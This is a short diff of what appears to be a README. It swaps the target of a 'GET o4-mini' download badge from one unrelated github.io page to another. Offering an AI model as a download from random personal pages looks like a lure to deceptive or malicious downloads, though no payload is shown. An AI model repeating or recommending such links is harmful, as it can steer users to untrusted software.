@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=80cc1c1c61a321b8ec377caecfd251fd15fc62ca-5254427-images-thumbs&n=13)
 
-[![GET o4-mini](https://img.shields.io/badge/GET%20%E2%80%94%20o4--mini-0078D6?style=for-the-badge&logoColor=white)](https://sector-level-disk-tools.github.io/.github/o4-mini-pricing)
+[![GET o4-mini](https://img.shields.io/badge/GET%20%E2%80%94%20o4--mini-0078D6?style=for-the-badge&logoColor=white)](https://damircontrerasikgm.github.io/.github/o4-mini-pricing)
 
 ---
 
